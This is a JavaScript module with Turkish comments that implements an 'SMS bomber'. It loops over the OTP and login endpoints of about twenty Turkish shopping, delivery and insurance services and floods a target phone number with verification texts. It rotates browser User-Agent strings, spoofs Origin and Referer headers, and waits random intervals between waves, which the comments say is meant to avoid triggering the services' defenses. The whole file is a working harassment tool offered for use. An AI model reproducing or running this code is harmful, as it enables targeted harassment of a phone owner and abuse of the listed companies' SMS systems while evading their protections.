const request = require('request');
const chalk = require('chalk');

// Her seferinde farklı bir tarayıcıymış gibi davranmak için User-Agent listesi
const agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1'
];

async function fire(url, data, label) {
    const options = {
        url: url,
        headers: {
            'User-Agent': agents[Math.floor(Math.random() * agents.length)],
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Origin': url.split('/api')[0],
            'Referer': url.split('/api')[0]
        },
        json: data,
        timeout: 8000
    };

    request.post(options, (err, res, body) => {
        if (!err && res && res.statusCode >= 200 && res.statusCode < 300) {
            console.log(chalk.green(`[+] ${label}: MERMİ GİTTİ (HIT)`));
        } else {
            console.log(chalk.red(`[-] ${label}: BLOKLANDI (${res ? res.statusCode : 'ERR'})`));
        }
    });
}

async function smsBomber(no, amount) {
    const full = "90" + no;

    for (let i = 0; i < amount; i++) {
        console.log(chalk.blue(`\n[#] Operasyon Dalgası: ${i + 1}`));

        // --- GÜNCEL VE AGRESİF SERVİSLER ---
        fire("https://api.getir.com/v1/auth/otp", { "phone": full }, "Getir");
        fire("https://api.yemeksepeti.com/v1/user/otp", { "phone": no }, "Yemeksepeti");
        fire("https://www.tiklagelsin.com/api/user/login", { "phone": no }, "TiklaGelsin");
        fire("https://pizzalazz.com.tr/api/login/send-otp", { "phone": no }, "PizzaLazz");
        fire("https://api-gateway.migros.com.tr/membership-service/v1/otp/send", { "phoneNumber": no }, "Migros");
        fire("https://www.sigortam.net/uyelik/otp-gonder", { "telefon": no }, "SigortamNet");
        fire("https://www.generali.com.tr/api/v1/otp", { "gsm": no }, "Generali");
        fire("https://api.trendyol.com/sapigw/membership/otp/send", { "phone": no }, "Trendyol");
        fire("https://www.lcwaikiki.com/tr-TR/TR/login/send-otp", { "phone": no }, "LCW");
        fire("https://www.defacto.com.tr/customer/send-otp", { "phone": no }, "DeFacto");
        fire("https://www.boyner.com.tr/api/v1/auth/otp", { "phone": no }, "Boyner");
        fire("https://www.letgo.com/api/v1/auth/otp", { "phone": no }, "Letgo");
        fire("https://api.taksi.com/v1/login/otp", { "phone": no }, "BiTaksi");
        fire("https://www.marti.tech/api/v1/auth/otp", { "phone": no }, "Marti");
        fire("https://www.hopishop.com/api/v1/auth/otp", { "phone": no }, "Hopi");
        fire("https://www.istegelsin.com/v1/user/otp", { "phoneNumber": full }, "IsteGelsin");
        fire("https://www.watsons.com.tr/api/v1/login/otp", { "phone": no }, "Watsons");
        fire("https://www.gratis.com/api/v1/auth/otp", { "phone": no }, "Gratis");
        fire("https://www.ebebek.com/api/v1/auth/otp", { "phone": no }, "Ebebek");
        fire("https://www.itopya.com/api/v1/auth/otp", { "phone": no }, "Itopya");

        // ÖNEMLİ: Servisleri uyandırmamak için her dalga arası rastgele bekleme (3-5 saniye)
        const wait = Math.floor(Math.random() * 2000) + 3000;
        await new Promise(r => setTimeout(r, wait));
    }
}

module.exports = smsBomber;
